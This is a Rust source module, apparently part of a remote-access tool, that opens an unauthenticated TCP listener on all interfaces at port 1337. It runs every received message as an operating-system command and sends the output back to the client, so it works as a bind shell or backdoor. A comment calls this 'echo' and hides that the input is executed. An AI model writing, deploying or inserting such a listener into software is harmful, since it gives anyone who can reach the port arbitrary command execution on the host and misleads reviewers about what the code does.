use std::io::{Error, Read, Write};
use std::net::{Shutdown, TcpListener, TcpStream};
use std::str::from_utf8;
use std::thread;

use crate::os;

const CHUNKS: usize = 1024;
const BIND_ADDR: &str = "0.0.0.0:1337";

fn handle_client(mut stream: TcpStream) {
    println!("Handling connection from {}", stream.peer_addr().unwrap());
    let mut data = [0 as u8; CHUNKS];
    while match stream.read(&mut data) {
        Ok(size) => {
            // echo everything!
            println!("Received {:?}", &data[0..size]);
            let output = os::run_command(from_utf8(&data[0..size]).unwrap());
            let stdout = output.unwrap().stdout;
            println!("Output: {}", from_utf8(&stdout).unwrap());
            stream.write(&stdout).unwrap();
            true
        }
        Err(_) => {
            println!(
                "An error occurred, terminating connection with {}",
                stream.peer_addr().unwrap()
            );
            stream.shutdown(Shutdown::Both).unwrap();
            false
        }
    } {}
}

pub fn run_server() -> Result<(), Error> {
    // If we can't open the server, it probably means:
    //  The port is already taken, or we are not running in sufficient permissions
    // If we are not running in sufficient permissions, panic.
    // If the port is open, also panic (In the future might add a feature to handle it)
    let listener = TcpListener::bind(BIND_ADDR)?;
    match listener.local_addr() {
        Ok(address) => {
            println!("Listening on: {:?}", address);
        }
        Err(e) => {
            println!("Error {} while trying to get local address.", &e);
        }
    };
    // accept connections and process them serially
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection with: {}", stream.peer_addr().unwrap());
                thread::spawn(move || {
                    // connection succeeded
                    handle_client(stream)
                });
            }
            Err(e) => {
                println!("Connection failed: {}", e);
                /* connection failed */
            }
        }
    }
    // TODO catch this panic
    panic!("Exit listener loop unexpectedly")
}
